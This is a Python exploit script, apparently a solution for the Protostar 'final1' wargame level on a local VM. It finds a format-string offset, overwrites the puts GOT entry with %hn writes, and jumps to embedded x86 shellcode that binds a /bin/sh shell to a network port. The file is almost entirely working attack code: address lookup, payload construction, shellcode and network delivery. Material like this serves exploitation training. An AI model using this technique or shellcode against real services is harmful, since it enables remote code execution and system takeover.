#!/usr/bin/env python
#-*- coding: utf-8 -*-

import sys
import struct
import subprocess
import re
import socket

import os, pwd, grp
def drop_privileges():
    success = True
    print('\n[+] Dropping privileges...')
    lines = ''
    with open('/proc/self/status', 'r') as fd:
        lines = fd.readlines()
    print('[+] Actual permissions: {0}'.format([line for line in lines if 'Uid' in line or 'Gid' in line]))
    running_uid = pwd.getpwnam('user').pw_uid
    running_gid = grp.getgrnam('user').gr_gid
    try:
        os.setgroups([])
    except OSError as e:
        print('[+] Error removing group permissions: {0}'.format(e))
        success = False
    try:
        os.setgid(running_gid)
    except OSError as e:
        print('[+] Error changing gid: {0}'.format(e))
        success = False
    try:
        os.setuid(running_uid)
    except OSError as e:
        print('[+] Error changing uid: {0}'.format(e))
        success = False
    try:
        os.seteuid(running_uid)
    except OSError as e:
        print('[+] Error changing euid: {0}'.format(e))
        success = False
    try:
        old_umask = os.umask(077)
    except OSError as e:
        print('[+] Error changing umask: {0}'.format(e))
        success = False
    lines = ''
    with open('/proc/self/status', 'r') as fd:
        lines = fd.readlines()
    print('[+] New permissions: {0}'.format([line for line in lines if 'Uid' in line or 'Gid' in line]))
    if success:
        print('[+] Privileges dropped\n')
    else:
        print('[+] Something went wrong dropping privileges...\n')


def find_var_addr(binary, var_name):
    hex_regex = re.compile('^0x[0-9A-Fa-f]{8}')
    if hex_regex.match(var_name):
        return int(var_name[2:].strip(), base=16)
    addr = 0
    if '@plt' in var_name:
        idx = var_name.find('@plt')
        var_name = var_name[0:idx]
        p1 = subprocess.Popen(["objdump", "-R", binary], stdout=subprocess.PIPE)
        p2 = subprocess.Popen(["grep", "-m", "1", var_name], 
                          stdin=p1.stdout, stdout=subprocess.PIPE)
    else:
        p1 = subprocess.Popen(["objdump", "-D", binary], stdout=subprocess.PIPE)
        p2 = subprocess.Popen(["grep", "-m", "1", '<'+var_name+'>'], 
                          stdin=p1.stdout, stdout=subprocess.PIPE)

    p3 = subprocess.Popen(["awk", "{FS = \" \"; print $1}" ], 
                      stdin=p2.stdout, stdout=subprocess.PIPE)
    p1.stdout.close()
    p2.stdout.close()
    res = p3.communicate()[0]

    if not res:
        print('[-] Variable not found. Note that this only works for variables ' \
              '(not functions). We search objdump output for \"<var_name>\"')
        exit()
    addr = int(res.strip(), base=16)
    return addr

def calc_payload(target_addr, offset, value, already_written=0): # magic formula
    hob, lob = divmod(value, 0x10000)
    addr_plus_2 = target_addr + 2
    hob_minus_8 = hob - 8 - already_written
    lob_minus_8 = lob - 8 - already_written
    lob_minus_hob = lob - hob
    hob_minus_lob = hob - lob
    offset_plus_1 = offset + 1
    
    print('[+] addr = {0}, addr + 2 = {1}'.format(hex(target_addr), 
                                                  hex(addr_plus_2)))
    print('[+] value = {0}, hob = {1}, lob = {2}'.format(hex(value), 
                                                         hex(hob), hex(lob)))
    print('[+] hob - 8 = {0}, lob - hob = {1}'.format(hex(hob_minus_8), 
                                                      hex(lob_minus_hob)))
    print('[+] lob - 8 = {0}, lob - hob = {1}'.format(hex(lob_minus_8), 
                                                      hex(lob_minus_hob)))
    print('[+] offset = {0}, offset + 1 = {1}'.format(hex(offset), 
                                                      hex(offset_plus_1)))
    print('[+] Bytes already written with the vulnerable function: {0}'.format(
                                                    already_written))

    if hob <= 8 or lob <= 8:
        print('[+] hob or lob <= 8')
        payload = struct.pack('<L', target_addr)
        payload += '%.' + str(value - 4) + 'd%' + str(i) + '$n'
        return payload

    if hob < lob:
        print('[+] hob < lob')
        payload = struct.pack('<L', addr_plus_2)
        payload += struct.pack('<L', target_addr)
        payload += '%' + str(hob_minus_8) + '.x%' + str(offset) + '$hn%.'
        payload += str(lob_minus_hob) + 'x%' + str(offset_plus_1) + '$hn'
        print('[+] Payload: [{0}][{1}]%[{2}].x%[{3}]' \
              '$hn%.[{4}]x%[{5}]$hn'.format(hex(addr_plus_2),hex(target_addr), 
                                           str(hob_minus_8), str(offset), 
                                           str(lob_minus_hob), 
                                           str(offset_plus_1)))
    else:
        print('[+] hob >= lob')
        payload = struct.pack('<L', addr_plus_2)
        payload += struct.pack('<L', target_addr)
        payload += '%' + str(lob_minus_8) + 'x%' + str(offset_plus_1) + '$hn%.'
        payload += str(hob_minus_lob) + 'x%' + str(offset) + '$hn'
        print('[+] Payload: [{0}][{1}]%.[{2}]x%[{3}]' \
              '$hn%.[{4}]x%[{5}]$hn'.format(hex(addr_plus_2),hex(target_addr), 
                                           str(lob_minus_8), str(offset_plus_1), 
                                           str(hob_minus_lob), str(offset)))
    return payload


def find_fmt_offset():
    MAX_TRIES = 8
    padding = ''
    i = 0
    for tries in range(MAX_TRIES):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        data = s.recv(1024)
        padding = ' ' * tries
        payload = 'username ' + SC + padding + '\n'
        s.send(payload)
        data = s.recv(1024)

        found = False
        for i in range(1, 512):
            payload = 'login '
            payload += struct.pack('<L', 0x41414141)
            payload += '.%' + str(i) + '$x'
            payload += '\n'

            s.send(payload)
            data = s.recv(1024)

            p = subprocess.Popen(["cat", "/var/log/user.log"], stdout=subprocess.PIPE)
            res = p.communicate()[0]
            p.stdout.close()

            out_regex = re.compile('AAAA.41414141')
            if out_regex.search(res):
                found = True
                break

        data = s.recv(1024)
        s.close()
        if found:
            print('[+] Offset found at {0} with padding: {1}'.format(i, len(padding)))
            break
        else:
            print('[+] Offset not found in try #{0}'.format(tries))
    return (i, padding) if found else (-1, padding)


def exploit(addr, value, fmt_offset, already_written=0, padding=''):

    fmt_payload = calc_payload(addr, fmt_offset, value, already_written)

    print('[+] Connecting to {0}:{1}'.format(HOST, PORT))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # dont check errors
    s.connect((HOST, PORT))

    data = s.recv(1024)
    print('[+] Received: {0}'.format(data))

    payload = 'username ' + SC + padding + '\n'
    b = s.send(payload)
    print('[+] {0} bytes sent. Data sent: {1}'.format(b, payload))
    data = s.recv(1024)
    print('[+] Received: {0}'.format(data))

    payload = 'login ' + fmt_payload + '\n'
    b = s.send(payload)
    print('[+] {0} bytes sent. Data sent: {1}'.format(b, payload))

    #data = s.recv(1024)
    s.close()


SC = "\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"
HOST = '127.0.0.1'
PORT = 2994
var_name = 'puts@plt'
addr = 0x804a194
addr = find_var_addr('/opt/protostar/bin/final1', 'puts@plt')
sc_loc = 'sc@username'
value = 0x0804a220 # sc@username global variable
value = find_var_addr('/opt/protostar/bin/final1', 'username')

fmt_offset_and_padding = find_fmt_offset()
fmt_offset = fmt_offset_and_padding[0]
padding= fmt_offset_and_padding[1]
if fmt_offset == -1:
    print('[-] Aborting exploitation')
    exit()

drop_privileges()
bytes_already_written = 50 + len(SC)

print('[+] Offset = {0}'.format(fmt_offset))
print('[+] Address to write in ({0}) = {1}'.format(var_name, hex(addr)))
print('[+] Address to be written ({0}) = {1}'.format(sc_loc, hex(value)))
print('[+] Shellcode length: {0}'.format(len(SC)))

exploit(addr, value, fmt_offset, bytes_already_written, padding)



